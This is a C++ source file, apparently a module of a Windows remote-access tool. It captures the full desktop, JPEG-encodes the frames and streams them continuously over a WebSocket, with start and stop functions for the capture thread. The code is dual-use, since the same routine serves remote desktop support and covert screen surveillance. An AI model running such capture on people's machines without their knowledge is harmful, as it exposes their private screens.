#include "screen.h"

cv::Mat captureScreenMat() {
    RECT desktop;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);

    int width = desktop.right;
    int height = desktop.bottom;

    HDC hScreenDC = GetDC(nullptr);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY | CAPTUREBLT);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    cv::Mat mat(height, width, CV_8UC3);
    GetDIBits(hMemoryDC, hBitmap, 0, height, mat.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);

    return mat;
}

void startScreen(std::shared_ptr<websocket::stream<tcp::socket>> ws_ptr) {
    std::lock_guard<std::mutex> lock(g_control_mutex);
    if (g_screen.load()) return; 
    g_screen = true;

    screen_thread = std::thread([ws_ptr]() {
        try {
            std::vector<BYTE> buf;

            while (g_screen.load()) {
                cv::Mat frame = captureScreenMat();
                if (frame.empty()) continue;

                cv::Mat smallFrame;
                cv::resize(frame, smallFrame, cv::Size(frame.cols / 3 * 2, frame.rows / 3 * 2));
                buf.clear();
                cv::imencode(".jpg", smallFrame, buf, {cv::IMWRITE_JPEG_QUALITY, 100});

                try {
                    sendMsg(*ws_ptr, "binary", "Screen", buf);
                } catch (std::exception& e) {
                    file_logger->error("WebSocket write error in screen thread: {}", e.what());
                    break;
                }

                std::this_thread::sleep_for(std::chrono::milliseconds(5)); 
            }
        } catch (std::exception& e) {
            file_logger->error("Screen thread exception: {}", e.what());
        }

        g_screen = false;
        file_logger->info("Screen thread stopped.");
    });
}

void stopScreen() {
    std::lock_guard<std::mutex> lock(g_control_mutex);
    if (!g_screen.load()) 
        return;

    g_screen = false;
    std::thread temp_thread = std::move(screen_thread); 

    std::thread([t = std::move(temp_thread)]() mutable { 
        try {
            if (t.joinable()) {
                t.join(); 
                file_logger->info("Reaper: Screen thread joined.");
            }
        } catch (const std::exception& e) {
            file_logger->error("Reaper: Exception caught joining screen thread: {}", e.what());
        } catch (...) {
            file_logger->error("Reaper: Unknown exception caught joining screen thread.");
        }
    }).detach(); 

}
